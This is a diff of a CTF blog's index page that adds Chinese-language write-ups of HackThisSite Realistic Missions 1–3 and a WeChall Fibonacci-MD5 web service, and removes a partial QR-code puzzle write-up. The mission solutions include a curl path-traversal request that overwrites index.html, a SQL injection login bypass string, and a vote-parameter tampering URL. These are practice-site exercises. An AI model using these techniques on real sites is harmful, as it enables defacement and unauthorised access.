@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">447</span>
+          <span class="site-state-item-count">451</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -272,6 +272,445 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-realistic-03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/HackThisSite/hackthissite-realistic-03/" class="post-title-link" itemprop="url">HackThisSite - Realistic Mission 3</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-09-08 18:16:01 / Modified: 22:40:47" itemprop="dateCreated datePublished" datetime="2026-09-08T18:16:01+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/HackThisSite/hackthissite-realistic-03/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-realistic-03/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Restore the original page of a defaced peace-poetry site.</p>
+</blockquote>
+<p>目标是找到原始主页备份，并恢复被篡改的 <code>index.html</code>。</p>
+<h3 id="solution">Solution</h3>
+<h4 id="找到备份">1. 找到备份</h4>
+<p>被篡改页面源码包含注释：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- oldindex.html --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问同目录的 <code>oldindex.html</code>
+可以取得原始页面内容，并看到诗歌读取和提交功能。</p>
+<h4 id="利用提交功能的路径穿越">2. 利用提交功能的路径穿越</h4>
+<p>提交处理器把用户提供的文件名直接用于保存路径。将文件名设为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../index.html</span><br></pre></td></tr></table></figure>
+<p>再把 <code>oldindex.html</code> 的完整内容作为诗歌正文提交：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OLD_HTML=$(curl -sS -b <span class="string">&quot;HackThisSite=&lt;mission-cookie&gt;&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://www.hackthissite.org/missions/realistic/3/oldindex.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">curl -sS -b <span class="string">&quot;HackThisSite=&lt;mission-cookie&gt;&quot;</span> \</span><br><span class="line">  -e <span class="string">&quot;https://www.hackthissite.org/missions/realistic/3/submitpoems.php&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;name=../index.html&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;text=<span class="variable">$&#123;OLD_HTML&#125;</span>&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://www.hackthissite.org/missions/realistic/3/submitpoems2.php&quot;</span></span><br></pre></td></tr></table></figure>
+<p>处理器要求来自 <code>submitpoems.php</code> 的
+Referer；使用浏览器操作时自然会满足，命令行测试则需显式设置。</p>
+<p>重新访问任务首页。恢复后的页面出现下一关链接，表示任务完成。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-realistic-02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/HackThisSite/hackthissite-realistic-02/" class="post-title-link" itemprop="url">HackThisSite - Realistic Mission 2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-09-08 18:15:09 / Modified: 22:43:29" itemprop="dateCreated datePublished" datetime="2026-09-08T18:15:09+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/HackThisSite/hackthissite-realistic-02/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-realistic-02/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Publish a message on the Chicago American Nazi Party site.</p>
+</blockquote>
+<p>目标是进入隐藏的更新功能并发布消息。</p>
+<h3 id="solution">Solution</h3>
+<p>主页底部有一个肉眼不明显的 <code>update</code>
+链接，页面源码确认它指向：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/missions/realistic/2/update.php</span><br></pre></td></tr></table></figure>
+<h4 id="绕过登录">2. 绕过登录</h4>
+<p><code>update.php</code> 的登录查询存在 SQL
+注入。用户名字段可提交：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 --</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-realistic-01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/HackThisSite/hackthissite-realistic-01/" class="post-title-link" itemprop="url">HackThisSite - Realistic Mission 1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-09-08 17:43:44 / Modified: 22:40:47" itemprop="dateCreated datePublished" datetime="2026-09-08T17:43:44+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/HackThisSite/hackthissite-realistic-01/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-realistic-01/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Raise the ranking of the band Raging Inferno on Uncle Arnold's Band
+Review Page.</p>
+</blockquote>
+<p>目标是让 Raging Inferno 排到乐队评分榜第一。</p>
+<h3 id="solution">Solution</h3>
+<h4 id="检查投票表单">1. 检查投票表单</h4>
+<p>页面使用 GET 表单提交投票，表单中限制评分选项为 1–5：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;v.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;vote&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vote!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Raging Inferno 的表单 ID 为
+<code>3</code>。下拉框只是客户端界面限制，不能代替服务端校验。</p>
+<h4 id="修改评分值">2. 修改评分值</h4>
+<p>可以在开发者工具中把 Raging Inferno 的一个 option 改成大于 5
+的值：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;9999&quot;</span>&gt;</span>9999<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>或者直接请求投票处理器</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/missions/realistic/1/v.php?PHPSESSID=&lt;current-value&gt;&amp;id=3&amp;vote=9999</span><br></pre></td></tr></table></figure>
+<p>提交后，Raging Inferno 的分数会超过原榜首，任务完成。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-few-bonaccis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-few-bonaccis/" class="post-title-link" itemprop="url">WeChall - Few Bonaccis</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-07 22:51:50" itemprop="dateCreated datePublished" datetime="2026-09-07T22:51:50+08:00">2026-09-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-few-bonaccis/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-few-bonaccis/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>题目要求提交一个公网可访问的 HTTP endpoint。WeChall 会多次请求
+<code>?n=N</code>，服务需要返回第 <code>N</code> 个 Fibonacci
+数的十进制字符串 MD5；每次请求的耗时上限是 <code>2.618</code> 秒。</p>
+<p>题面给出的样例是：<code>n=100</code>
+时，<code>F(100) = 354224848179261915075</code>，返回值应为
+<code>d8400bceb05dfe785afcd2da4fdb010e</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>服务监听本地 <code>8765</code> 端口，读取查询参数
+<code>n</code>，计算 Fibonacci 数，再对它的十进制表示计算 MD5。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Fast Fibonacci MD5 microservice for WeChall Few Bonaccis challenge.</span></span><br><span class="line"><span class="string">Returns MD5 of the Nth Fibonacci number (as decimal string).</span></span><br><span class="line"><span class="string">Uses gmpy2.fib() which is highly optimized GMP implementation.</span></span><br><span class="line"><span class="string">Handles negative indices: F(-n) = (-1)^(n+1) * F(n)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove int-&gt;str conversion limit for large numbers</span></span><br><span class="line">sys.set_int_max_str_digits(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Compute F(n) for any integer n (including negative).</span></span><br><span class="line"><span class="string">    F(-n) = (-1)^(n+1) * F(n)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> gmpy2.fib(n)</span><br><span class="line"></span><br><span class="line">    pos_n = -n</span><br><span class="line">    f_pos = gmpy2.fib(pos_n)</span><br><span class="line">    <span class="keyword">if</span> pos_n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -f_pos</span><br><span class="line">    <span class="keyword">return</span> f_pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FibHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        parsed = urlparse(<span class="variable language_">self</span>.path)</span><br><span class="line">        params = parse_qs(parsed.query)</span><br><span class="line">        n_str = params.get(<span class="string">&quot;n&quot;</span>, [<span class="literal">None</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> n_str <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_error(<span class="number">400</span>, <span class="string">&quot;Missing n parameter&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            n = <span class="built_in">int</span>(n_str)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="variable language_">self</span>.send_error(<span class="number">400</span>, <span class="string">&quot;Invalid n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        f = fib(n)</span><br><span class="line">        fib_str = <span class="built_in">str</span>(f)</span><br><span class="line">        md5_hash = hashlib.md5(fib_str.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">        body = md5_hash.encode()</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Length&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(body)))</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        sys.stderr.write(<span class="string">f&quot;[Fib] <span class="subst">&#123;args[<span class="number">0</span>]&#125;</span> <span class="subst">&#123;args[<span class="number">1</span>]&#125;</span> <span class="subst">&#123;args[<span class="number">2</span>]&#125;</span>\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="number">8765</span></span><br><span class="line">    server = HTTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, port), FibHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Fibonacci MD5 service listening on port <span class="subst">&#123;port&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+<p>把本地端口通过 <code>cloudflared</code> 暴露出去，并把公网入口提交给
+WeChall：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cloudflared tunnel --url http://127.0.0.1:8765</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -949,555 +1388,8 @@ Morse 电码的英文拼写形式。</p>
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-inka/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-inka/" class="post-title-link" itemprop="url">WeChall - Inka</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-08-18 18:27:57" itemprop="dateCreated datePublished" datetime="2026-08-18T18:27:57+08:00">2026-08-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:12:09" itemprop="dateModified" datetime="2026-09-15T10:12:09+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-inka/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-inka/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>题面是一首诗歌，以及一个"weird formula"链接
-<code>inka.php</code>。</p>
-<p>访问 <code>inka.php</code> 会得到随机的三个二进制数组成的表达式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A * B + C</span><br></pre></td></tr></table></figure>
-<p>其中 A ≈ 593 位、B/C ≈ 33 位，每次请求都重新生成。提示"some 3rd party
-lib"。</p>
-<p>提交答案有严格限制：<strong>每个问题只能提交 1
-次</strong>（错误/正确都会消耗该问题），提交错误会泄露正确答案（<code>Correct would have been: XXX</code>），但无法再提交；需重新
-GET 才有新问题。答案固定 15 个大写字母。</p>
-<p>另有<strong>响应时限</strong>：GET 到提交的间隔超限会返回
-<code>You are slow, slow, slow! You took Xs but your limit is Y.</code>。limit
-每次随机（实测出现过 0.50s 与 &gt;5.3s），保险做法是单进程内
-GET→解码→POST （本地解码仅需 0ms，zxingcpp scale=1 即可）。</p>
-<h3 id="solution">Solution</h3>
-<p><strong>关键洞察</strong>：<code>N = A * B + C</code> 恰好是
-<strong>625 位 = 25×25 = QR 码 Version 2</strong>。painting
-就是一幅"墙上的画"（QR 码）。"3rd party lib" = QR 库（如 phpqrcode）</p>
-<p>解法流程：</p>
-<ol type="1">
-<li>GET <code>inka.php</code>（需过 Anubis，用
-<code>techaro.lol-anubis-auth</code> cookie jar）拿 painting</li>
-<li>提取 A、B、C 三个二进制数</li>
-<li><code>N = A*B + C</code>，转 625 位二进制，排成 25×25 矩阵</li>
-<li><strong>反色</strong>（painting 中 1=白 0=黑，zxing 需 inverted
-才能解）</li>
-<li>QR 解码 → 15 字符答案</li>
-<li>立即提交 <code>inka.php?answer=&lt;ANSWER&gt;</code></li>
-</ol>
-<h3 id="solve-script">Solve Script</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span 